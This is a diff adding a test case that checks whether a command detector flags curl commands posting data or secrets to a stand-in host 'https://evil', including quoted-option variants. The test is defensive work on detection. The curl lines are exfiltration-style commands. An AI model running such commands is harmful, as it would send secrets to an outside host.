@@ -413,4 +413,12 @@ describe("validated write-out format strings clear as reads on any host", () => 
 			expect(outbound(command)).toBe(true);
 		});
 	}
+	test("send-data detection reads tokenized words, not raw text", () => {
+		// Codex round 7: quoted options and value forms must stand the
+		// /dev/null clearing down exactly like bare ones.
+		expect(outbound('curl --data-urlencode secret -o /dev/null https://evil')).toBe(true);
+		expect(outbound('curl --request POST -o /dev/null https://evil')).toBe(true);
+		expect(outbound('curl -X "POST" -o /dev/null https://evil')).toBe(true);
+		expect(outbound('curl "-d" secret -o /dev/null https://evil')).toBe(true);
+	});
 });
